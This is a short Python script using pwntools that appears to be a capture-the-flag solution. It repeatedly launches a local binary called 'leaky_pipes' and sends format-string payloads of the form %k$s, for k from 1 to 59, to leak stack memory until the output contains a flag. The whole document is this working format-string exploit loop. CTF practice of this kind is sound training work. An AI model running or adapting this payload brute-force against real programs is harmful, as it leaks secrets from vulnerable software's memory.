from pwn import *

context.binary = binary = ELF("./leaky_pipes")

def find_flag_index():
    for k in range(1, 60):  # Start from 1 to avoid potential issues with %0$s
        format_s = f"%{k}$s".encode("utf-8")
        p = process(binary.path)
        p.recvuntil(b">> ")
        p.sendline(format_s)
        output = p.recvall(timeout=1).decode("latin-1", errors="ignore")
        p.close()

        # Check if the output looks like it might contain the flag
        if "{" in output:
            return k, output.strip()

    return None, None

flag_index, flag_output = find_flag_index()

if flag_index:
    print(f"Flag found at index {flag_index}: {flag_output}")
else:
    print("Flag not found in the given range.")
